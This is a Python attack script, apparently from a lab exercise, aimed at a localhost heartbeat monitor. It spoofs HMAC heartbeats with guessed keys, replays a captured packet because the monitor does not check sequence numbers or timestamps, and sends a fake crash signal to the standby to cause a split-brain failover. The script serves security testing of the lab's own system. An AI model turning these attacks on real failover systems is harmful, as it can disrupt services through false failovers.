import os
import time
import socket
import random
import hmac
import sys

# Hardcoded victim host and port
MONITOR_HOST = "127.0.0.1"
MONITOR_PORT = 9999
FAILOVER_PORT = 9998


def log(msg: str) -> None:
    ts = time.strftime("%H:%M:%S")
    print(f"[adversary {ts}] {msg}", flush=True)

# Should not work because we have HMAC implemented


def heartbeat_spoofing(number_of_attacks: int = 5, interval: float = 1.0):
    def guess_secret() -> bytes:
        length = random.randint(16, 32)
        return random.randbytes(length)

    def guess_sequence() -> int:
        return random.randint(0, 1000000)

    def make_heartbeat(seq: int, secret: bytes) -> bytes:
        ts = str(int(time.time() * 1000))  # timestamp in milliseconds
        message = f"{seq}|{ts}".encode()
        mac = hmac.digest(secret, message, "sha256").hex()
        return message + b"|" + mac.encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    log(
        f"Starting heartbeat spoofing attack against victim: {MONITOR_HOST}:{MONITOR_PORT}")

    for i in range(number_of_attacks):
        seq = guess_sequence()
        secret = guess_secret()
        packet = make_heartbeat(seq, secret)
        sock.sendto(packet, (MONITOR_HOST, MONITOR_PORT))
        log(f"Sent spoofed heartbeat {i} to {MONITOR_HOST}:{MONITOR_PORT} seq={seq} guessed key (hex)={secret.hex()}")
        time.sleep(interval)

    sock.close()
    log("Heartbeat spoofing attack finished")

# Should work because we don't verify sequence number or time


def replay_attack(number_of_attacks: int = 35, interval: float = 2.0):
    CAPTURED_PACKET = "1|1792613128187|d10950e6bed650bf5cc55337e4f1d2b0bcf16c6e0377adc9d8233ca31f0309af"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    log(
        f"Starting replay attack against victim: {MONITOR_HOST}:{MONITOR_PORT}. With captured packet: {CAPTURED_PACKET}")

    for i in range(number_of_attacks):
        sock.sendto(CAPTURED_PACKET.encode(), (MONITOR_HOST, MONITOR_PORT))
        log(f"Sent replayed packet {i} to {MONITOR_HOST}:{MONITOR_PORT}")
        time.sleep(interval)

    sock.close()
    log("Replay attack finished")


# Attack scenario 1: Induced False Failover
# Sending a direct fake crash signal to the standby causing splitbrain
def induced_failover():
    log(f"Starting induced failover attack on UDP {FAILOVER_PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"SERVICE_CRASHED"
    sock.sendto(packet, (MONITOR_HOST, FAILOVER_PORT))
    log(f"Sent fake crash signal to Standby! ")
    sock.close()


if __name__ == "__main__":
    if len(sys.argv) == 2:
        argument = sys.argv[1].lower()
        if argument == "heartbeat":
            heartbeat_spoofing()
        elif argument == "replay":
            replay_attack()
        elif argument == "induced_failover":
            induced_failover()
        else:
            log("Usage: python adversary.py [heartbeat|replay|failover]")
    else:
        log("Usage: python adversary.py [heartbeat|replay|failover]")
